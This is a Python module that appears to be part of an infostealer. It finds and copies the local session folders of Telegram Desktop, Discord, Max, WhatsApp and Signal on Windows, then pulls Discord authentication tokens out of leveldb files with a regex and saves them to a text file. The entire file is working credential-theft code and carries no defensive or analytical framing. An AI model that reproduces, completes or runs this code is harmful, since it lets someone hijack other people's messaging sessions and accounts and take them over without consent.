import os
import re
import shutil
from pathlib import Path

from core.logger import logger

TELEGRAM_PATHS = [r"Telegram Desktop\tdata"]

DISCORD_PATHS = [
    r"discord\Local Storage\leveldb",
    r"discordcanary\Local Storage\leveldb",
    r"discordptb\Local Storage\leveldb",
]

MAX_PATHS = [
    r"Max",
    r"Max\Cache",
    r"Max\Local Storage",
    r"Max\Session Storage",
    r"Max\tdata",
]

WHATSAPP_PATHS = [r"WhatsApp"]
SIGNAL_PATHS = [r"Signal"]

TOKEN_REGEX = re.compile(
    r"(?:mfa\.[\w-]{84}|[\w-]{24,28}\.[\w-]{6}\.[\w-]{27,38})"
)


def _appdata() -> Path:
    return Path(os.getenv("APPDATA", ""))


def _local_appdata() -> Path:
    return Path(os.getenv("LOCALAPPDATA", ""))


def _copy_dir(src: Path, dst: Path) -> bool:
    try:
        if not src.exists():
            return False
        if dst.exists():
            shutil.rmtree(dst, ignore_errors=True)
        shutil.copytree(src, dst)
        return True
    except Exception as e:
        logger.error(f"copy dir failed {src}: {e}")
        return False


def _grab_telegram(out: Path) -> None:
    for rel in TELEGRAM_PATHS:
        src = _appdata() / rel
        if src.exists():
            logger.info("telegram tdata found")
            _copy_dir(src, out / "telegram_tdata")


def _grab_discord(out: Path) -> None:
    for rel in DISCORD_PATHS:
        src = _appdata() / rel
        if src.exists():
            name = rel.split("\\")[0]
            logger.info(f"discord found: {name}")
            _copy_dir(src, out / f"discord_{name}")


def _grab_max(out: Path) -> None:
    for rel in MAX_PATHS:
        src = _appdata() / rel
        if not src.exists():
            src = _local_appdata() / rel
        if src.exists():
            logger.info(f"max found: {rel}")
            safe = rel.replace("\\", "_")
            _copy_dir(src, out / f"max_{safe}")


def _grab_whatsapp(out: Path) -> None:
    for rel in WHATSAPP_PATHS:
        src = _appdata() / rel
        if src.exists():
            logger.info("whatsapp found")
            _copy_dir(src, out / "whatsapp")


def _grab_signal(out: Path) -> None:
    for rel in SIGNAL_PATHS:
        src = _appdata() / rel
        if src.exists():
            logger.info("signal found")
            _copy_dir(src, out / "signal")


def _extract_discord_tokens(discord_dir: Path, out_file: Path) -> None:
    tokens = set()
    if not discord_dir.exists():
        return
    for f in discord_dir.rglob("*.ldb"):
        try:
            data = f.read_bytes().decode("utf-8", errors="ignore")
            for m in TOKEN_REGEX.findall(data):
                if len(m) > 50:
                    tokens.add(m)
        except Exception:
            pass
    if tokens:
        existing = set()
        if out_file.exists():
            existing = set(out_file.read_text(encoding="utf-8").splitlines())
        all_tokens = existing | tokens
        out_file.write_text("\n".join(sorted(all_tokens)), encoding="utf-8")
        logger.info(f"discord tokens: {len(tokens)} new")


def collect(out: Path) -> None:
    out.mkdir(parents=True, exist_ok=True)
    _grab_telegram(out)
    _grab_discord(out)
    _grab_max(out)
    _grab_whatsapp(out)
    _grab_signal(out)

    tokens_file = out / "discord_tokens.txt"
    for sub in out.glob("discord_*"):
        _extract_discord_tokens(sub, tokens_file)
